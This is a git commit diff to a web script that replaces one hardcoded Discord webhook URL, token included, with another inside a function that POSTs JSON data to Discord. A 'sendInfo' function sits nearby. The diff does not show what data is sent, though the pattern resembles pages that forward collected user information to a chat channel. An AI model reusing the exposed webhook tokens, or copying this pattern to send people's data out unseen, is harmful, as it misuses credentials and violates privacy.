7e12660fc9981acc0302a4854ee829c43b8bc0e7
Fox6a7 <yassineaa977@gmail.com>
2026-03-24 18:43:15 +0100

    aucun

--- scripts/script.js
+++ scripts/script.js
@@ -15,7 +15,7 @@ function sendInfo(){
 }
 
 async function sendWebHook(string){
-    const reponse = await fetch("https://discord.com/api/webhooks/1486035775903764580/A9KwAwU9C5YOo3HBD0FO_sd7DexubTfUSc51DViJbKyy66Z55DjmzLswTSilZP1hxOVv", {
+    const reponse = await fetch("https://discord.com/api/webhooks/1486057743285747872/1DUkcj47c-lwt4jKksxTiR5OKU_cJp3fE1z2028bZhGnPrqRv2Un25Hm5OuNNgL3BRaQ", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
